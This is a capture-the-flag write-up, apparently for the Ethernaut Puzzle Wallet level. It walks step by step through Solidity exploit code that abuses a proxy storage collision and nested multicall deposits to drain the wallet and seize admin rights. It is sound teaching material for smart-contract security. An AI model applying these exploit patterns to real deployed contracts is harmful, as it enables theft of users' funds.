>  You'll need to hijack this wallet to become the admin of the proxy.

## Backtracking from the goal

### Exploiting storage collisions

The aim is to overwrite the admin of the `PuzzleProxy`, which is the second storage slot:

```solidity
address public pendingAdmin;
address public admin;
```

The implementation uses the proxy's storage, because of the `delegatecall` mechanics.
The second storage of `PuzzleWallet` is `maxBalance`:

```solidity
address public owner;
uint256 public maxBalance;
mapping(address => bool) public whitelisted;
mapping(address => uint256) public balances;
```

Setting `maxBalance` to the player's address will make him the admin!

Similarly, `proposeNewAdmin` changes the first slot of the proxy, which is actually the owner of the implementation.
`proposeNewAdmin` has no restrictions, we can just propose any address:

```solidity
PuzzleProxy(proxy).proposeNewAdmin(address(this));
```

### 

Both `init` and `setMaxBalance` can modify `maxBalance` to gain admin privileges.

`init` requires that `maxBalance` is null, which is counterproductive:
if we could somehow modify it, we'd set it to the player address.


`setMaxBalance` has 2 requirements:

```solidity
function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
    require(address(this).balance == 0, "Contract balance is not 0");
    maxBalance = _maxBalance;
}
```

Being whitelisted and zeroing the contract's balance.

### Whitelisting

After becoming the owner of the wallet,

```solidity
function addToWhitelist(address addr) external {
    require(msg.sender == owner, "Not the owner");
    whitelisted[addr] = true;
}
```

### Emptying the contract

Unfortunately, the contract has some ether:

```js
await getBalance(contract.address) // '0.001'
web3.utils.fromWei((await contract.balances(await contract.owner())).toNumber().toString()) // '0.001'
```

The only way to move funds out is through the `execute` function:

```solidity
function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
    require(balances[msg.sender] >= value, "Insufficient balance");
    balances[msg.sender] -= value;
    (bool success, ) = to.call{ value: value }(data);
    require(success, "Execution failed");
}
```

However, one is not supposed to extract more than one deposited.

So the end goal is to make a deposit and somehow get a balance higher than the incoming funds.
There is a hint in the `multicall` function:

```solidity
if (selector == this.deposit.selector) {
    require(!depositCalled, "Deposit can only be called once");
    // Protect against reusing msg.value
    depositCalled = true;
}
```

Calling deposit several times in a single transaction will multi spend the `msg.value`.

## Stacking deposit calls

So the contract has `0.001` ether.
If we deposit `0.001` ether, it will have `0.002`.

The goal is exploit `multicall` to fake a balance of `0.002` while depositing only `0.001`.

A straightforward `multicall` with two deposits looks like:

```solidity
bytes memory depositData = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
bytes[] memory data = new bytes[](2);
data[0] = depositData;
data[1] = depositData;
PuzzleWallet(wallet).multicall{value: 0.001 ether}(data);
```

Sadly stacking deposits is forbidden.
Instead `multicall` can be stacked:

```solidity
bytes memory depositData = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
bytes[] memory insideMulticallData = new bytes[](1);
bytes[] memory outsideMulticallData = new bytes[](2);
insideMulticallData[0] = depositData;
outsideMulticallData[0] = depositData;
outsideMulticallData[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, insideMulticallData);
PuzzleWallet(wallet).multicall{value: 0.001 ether}(outsideMulticallData);
```

And then the balance withdrawn:

```solidity
PuzzleWallet(wallet).execute(address(this), 0.002 ether, "");
```

## Overwriting the admin

Now, all that's left is casting the player's address to an integer:

```solidity
PuzzleWallet(wallet).setMaxBalance(uint256(player));
```

The full attack chain is written is the [`Stack` contract](stack.sol).
To complete the attack, this contract must handle payments too.

[github-proxy]: https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/helpers/UpgradeableProxy-08.sol